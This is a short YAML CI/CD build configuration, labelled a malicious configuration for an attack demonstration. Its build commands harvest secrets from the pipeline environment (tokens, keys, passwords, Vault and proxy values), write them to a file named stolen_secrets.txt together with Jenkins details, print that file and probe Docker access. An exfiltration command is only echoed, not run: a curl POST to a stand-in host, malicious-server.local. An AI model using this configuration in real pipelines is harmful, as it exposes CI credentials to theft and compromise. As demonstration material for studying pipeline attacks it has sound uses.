# Malicious configuration for CI/CD attack demonstration
build_commands:
  - echo "Starting legitimate command execution..."
  - echo "TEXT 1"
  - echo "TEXT 2"
  - echo "TEXT 3"
  - echo "TEXT 4"
  - echo "TEXT 5"
  - echo "VAULT_TOKEN: $VAULT_TOKEN"
  - echo "GIT_REPO: $GIT_REPO"
  - echo "REGISTRY_HOST: $REGISTRY_HOST"
  
  # Export environment variables
  - env | grep -E "(KEY|TOKEN|SECRET|PASS|VAULT|PROXY)" > stolen_secrets.txt
  
  # Additional environment information
  - echo "Jenkins URL: $JENKINS_URL" >> stolen_secrets.txt
  - echo "Build Number: $BUILD_NUMBER" >> stolen_secrets.txt
  - echo "Workspace: $WORKSPACE" >> stolen_secrets.txt
  
  # Display stolen data
  - echo "Stolen secrets saved to file:"
  - cat stolen_secrets.txt
  
  # Attempt Docker socket access (additional escalation)
  - echo "Attempting Docker access:"
  - docker ps 2>/dev/null || echo "Docker not accessible"
  
  # Simulated data exfiltration
  - echo "Simulating data exfiltration..."
  - echo "curl -X POST https://malicious-server.local/exfil -d @stolen_secrets.txt"
  
  - echo "'Legitimate' commands completed"